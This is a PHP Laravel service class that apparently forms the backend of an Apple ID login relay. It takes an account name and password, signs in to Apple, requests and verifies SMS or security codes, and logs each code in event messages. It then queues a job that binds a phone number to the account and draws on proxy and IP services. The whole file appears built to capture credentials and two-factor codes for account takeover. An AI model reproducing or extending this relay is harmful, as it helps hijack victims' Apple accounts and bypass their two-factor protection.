<?php

namespace App\Apple;


use App\Apple\PhoneNumber\PhoneNumberFactory;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Ip\IpService;
use App\Jobs\BindAccountPhone;
use App\Models\SecuritySetting;
use App\Proxy\ProxyService;
use Carbon\Carbon;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;
use Weijiajia\DataConstruct\Phone;
use Weijiajia\Exception\VerificationCodeException;

class IndexControllerService
{


    public function __construct(
        protected readonly AppleClientService $appleClientService,
        protected readonly PhoneNumberFactory $phoneNumberFactory,
        protected readonly IpService          $ipService,
        protected readonly ProxyService       $proxyService,
    )
    {

    }

    public function getGuid(): string
    {
        return $this->appleClientService->getGuid();
    }

    protected function validateAccount(string $accountName): string
    {
        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails() && !Str::startsWith('+',$accountName)) {
            $accountName = $this->formatPhone($accountName);
        }

        return $accountName;
    }

    protected function dispatchBindAccountPhone(): void
    {
        BindAccountPhone::dispatch($this->appleClientService->getAccount()->id,$this->getGuid())
            ->delay(Carbon::now()->addSeconds(5));

    }

    public function verifyAccount(string $accountName,string $password)
    {
        $accountName = $this->validateAccount($accountName);

        $response = $this->appleClientService->sign($accountName,$password);

        $account = $this->appleClientService->getAccountByCache();

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));

        return $response;
    }

    public function getPhoneLists(): Collection
    {
        return $this->appleClientService->getPhoneLists();
    }
    public function getTrustedPhoneNumber(): ?Phone
    {
        return $this->appleClientService->getTrustedPhoneNumber();
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    public function sendSms(int $id)
    {
        return $this->appleClientService->sendPhoneSecurityCode($id);
    }

    public function sendSecurityCode()
    {
        return $this->appleClientService->sendSecurityCode();
    }

    public function verifyPhoneCode(string $id,string $code)
    {
        $account = $this->appleClientService->getAccountByCache();
        try {

            $response = $this->appleClientService->verifyPhoneCode($id,$code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));

        } catch (VerificationCodeException $e) {

            Event::dispatch(new AccountAuthFailEvent(account: $account,description: ($e->getMessage())));
            throw $e;
        }

        $this->dispatchBindAccountPhone();

        return $response;
    }

    public function verifySecurityCode(string $code)
    {
        $account = $this->appleClientService->getAccountByCache();
        try {


            $response = $this->appleClientService->verifySecurityCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));

        } catch (VerificationCodeException $e) {

            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
            throw $e;
        }

        $this->dispatchBindAccountPhone();

        return $response;
    }
}

